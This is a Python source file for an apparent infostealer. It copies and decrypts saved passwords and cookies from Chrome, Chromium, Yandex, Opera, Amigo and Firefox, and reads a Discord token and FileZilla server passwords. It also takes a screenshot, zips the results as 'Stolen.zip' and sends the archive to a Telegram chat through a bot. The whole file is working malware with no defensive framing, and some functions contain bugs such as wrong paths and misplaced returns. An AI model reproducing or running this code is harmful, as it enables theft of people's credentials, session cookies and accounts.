import base64
import os
import sqlite3
import win32crypt
import shutil
import zipfile

import telebot
from PIL import ImageGrab
from lxml import etree

username = os.getlogin()
token = os.getenv('bot_token')
bot = telebot.TeleBot(token)


def Chrome():
    text = 'Google\n\n\nPasswords Chrome:' + '\n'
    text += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data',
                     os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')

        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                text += url + ' | ' + login + ' | ' + password + '\n'
    return text

file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+")
file.write(str(Chrome()) + '\n')
file.close()


def Chrome_cookie():
    """ google cookies """

    textc = 'Google\n\n\nCookies Chrome:' + '\n'
    textc += 'URL | COOKIE | COOKIE NAME' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies',
                     os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
        cursor = conn.cursor()
        cursor.execute("SELECT * from cookies")
        for result in cursor.fetchall():
            cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
            name = result[2]
            url = result[1]
            textc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
    return textc

file = open(os.getenv("APPDATA") + '\\google_cookies.txt', "w+")  # данные
file.write(str(Chrome_cookie()) + '\n')
file.close()


def Yandex():
    """ yandex cookies """
    texty = 'Yandex\n\n\nYANDEX Cookies:' + '\n'
    texty += 'URL | COOKIE | COOKIE NAME' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies',
                     os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies2')
        cursor = conn.cursor()
        cursor.execute("SELECT * from cookies")
        for result in cursor.fetchall():
            cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
            name = result[2]
            url = result[1]
            texty += url + ' | ' + str(cookie) + ' | ' + name + '\n'
    return texty

file = open(os.getenv("APPDATA") + '\\yandex_cookies.txt', "w+")  # данные
file.write(str(Yandex()) + '\n')
file.close()


def Firefox():
    textf = ''
    textf += '\n' + 'FireFox\n\n\nFirefox Cookies:' + '\n'
    textf += 'URL | COOKIE | COOKIE NAME' + '\n'
    for root, dirs, files in os.walk(os.getenv("APPDATA") + '\\Mozilla\\Firefox\\Profiles'):
        for name in dirs:
            conn = sqlite3.connect(os.path.join(root, name) + '\\cookies.sqlite')
            cursor = conn.cursor()
            cursor.execute("SELECT baseDomain, value, name  FROM moz_cookies")
            data = cursor.fetchall()
            for i in range(len(data)):
                url, cookie, name = data[i]
                textf += url + ' | ' + str(cookie) + ' | ' + name + '\n'
        break
    return textf

file = open(os.getenv("APPDATA") + '\\firefox_cookies.txt', "w+")  # данные
file.write(str(Firefox()) + '\n')
file.close()


def chromium():
    textch = '\n' + 'Chrom\n\n\nChromium Passwords:' + '\n'
    textch += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data',
                     os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                textch += url + ' | ' + login + ' | ' + password + '\n'
                return textch

file = open(os.getenv("APPDATA") + '\\chromium.txt', "w+")  # данные
file.write(str(chromium()) + '\n')
file.close()


def chromium():
    textchc = ''
    textchc += '\n' + 'Chrom2\n\n\nChromium Cookies:' + '\n'
    textchc += 'URL | COOKIE | COOKIE NAME' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies',
                     os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
        cursor = conn.cursor()
        cursor.execute("SELECT * from cookies")
        for result in cursor.fetchall():
            cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
            name = result[2]
            url = result[1]
            textchc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
    return textchc

file = open(os.getenv("APPDATA") + '\\chromium_cookies.txt', "w+")  # данные
file.write(str(chromium()) + '\n')
file.close()


def Amigo():
    textam = 'Passwords Amigo:' + '\n'
    textam += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data',
                     os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                textam += url + ' | ' + login + ' | ' + password + '\n'

file = open(os.getenv("APPDATA") + '\\amigo_pass.txt', "w+")  # данные
file.write(str(Amigo()) + '\n')
file.close()


def Amigo_c():
    textamc = 'Cookies Amigo:' + '\n'
    textamc += 'URL | COOKIE | COOKIE NAME' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies',
                     os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies2')
        cursor = conn.cursor()
        cursor.execute("SELECT * from cookies")
        for result in cursor.fetchall():
            cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
            name = result[2]
            url = result[1]
            textamc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
    return textamc

file = open(os.getenv("APPDATA") + '\\amigo_cookies.txt', "w+")  # данные
file.write(str(Amigo_c()) + '\n')
file.close()


def Opera():
    texto = 'Passwords Opera:' + '\n'
    texto += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
        shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data',
                     os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                texto += url + ' | ' + login + ' | ' + password + '\n'

file = open(os.getenv("APPDATA") + '\\opera_pass.txt', "w+")  # данные
file.write(str(Opera()) + '\n')
file.close()


def Yandexpass():
    textyp = 'Passwords Yandex:' + '\n'
    textyp += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data.db'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data.db',
                     os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data2.db')
        conn = sqlite3.connect(
            os.getenv("LOCALAPPDATA") + '\\Yandexe\\YandexBrowser\\User Data\\Default\\Ya Login Data2.db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                textyp += url + ' | ' + login + ' | ' + password + '\n'
    return textyp

file = open(os.getenv("APPDATA") + '\\yandex_passwords.txt', "w+")  # данные
file.write(str(Yandexpass()) + '\n')
file.close()


def Opera_c():
    textoc = '\n' + 'Cookies Opera:' + '\n'
    textoc += 'URL | COOKIE | COOKIE NAME' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies',
                     os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
        cursor = conn.cursor()
        cursor.execute("SELECT * from cookies")
        for result in cursor.fetchall():
            cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
            name = result[2]
            url = result[1]
            textoc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
    return textoc

file = open(os.getenv("APPDATA") + '\\opera_cookies.txt', "w+")  # данные
file.write(str(Opera_c()) + '\n')
file.close()


def discord_token():
    """ discord token """

    if os.path.isfile(os.getenv("APPDATA") + '/discord/Local Storage/https_discordapp.com_0.localstorage') is True:
        token = ''
        conn = sqlite3.connect(os.getenv("APPDATA") + "/discord/Local Storage/https_discordapp.com_0.localstorage")
        cursor = conn.cursor()
        for row in cursor.execute("SELECT key, value FROM ItemTable WHERE key='token'"):
            token = row[1].decode("UTF-16")  # КОДИРОВКА №16
        conn.close()
        if token != '':
            return token
        else:
            return 'Discord exists, but not logged in'
    else:
        return 'Not found'

ds_token = discord_token()
ds_token += 'Discord token:' + '\n' + discord_token() + '\n' + '\n'

file = open(os.getenv("APPDATA") + '\\discord_token.txt', "w+")  # данные
file.write(str(discord_token()) + '\n')
file.close()


def filezilla():
    """ filezilla """
    try:
        data = ''
        if os.path.isfile(os.getenv("APPDATA") + '\\FileZilla\\recentservers.xml') is True:
            root = etree.parse(os.getenv("APPDATA") + '\\FileZilla\\recentservers.xml').getroot()

            for i in range(len(root[0])):
                host = root[0][i][0].text
                port = root[0][i][1].text
                user = root[0][i][4].text
                password = base64.b64decode(root[0][i][5].text).decode('utf-8')
                data += 'host: ' + host + '|port: ' + port + '|user: ' + user + '|pass: ' + password + '\n'
            return data
        else:
            return 'Not found'
    except Exception:
        return 'Error'

textfz = filezilla()
textfz += 'Filezilla: ' + '\n' + filezilla() + '\n'

file = open(os.getenv("APPDATA") + '\\filezilla.txt', "w+")  # данные
file.write(str(filezilla()) + '\n')
file.close()


def save_passwords_data():

    screen = ImageGrab.grab()
    screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')  # данные

    zname = r'D:\Stolen.zip'  # название и путь к файлу
    newzip = zipfile.ZipFile(zname, 'w')  # запаковываем в архив
    newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\google_pass.txt')
    newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\google_cookies.txt')
    newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\yandex_cookies.txt')
    newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\chromium.txt')
    newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\chromium_cookies.txt')
    newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\amigo_pass.txt')
    newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\amigo_cookies.txt')
    newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\opera_pass.txt')
    newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\opera_cookies.txt')
    newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\discord_token.txt')
    newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\filezilla.txt')
    newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\sreenshot.jpg')
    newzip.close()

    doc = 'D:\Stolen.zip'
    send_to_chat_id = os.getenv("chat_id")

    bot.send_document(send_to_chat_id, doc)
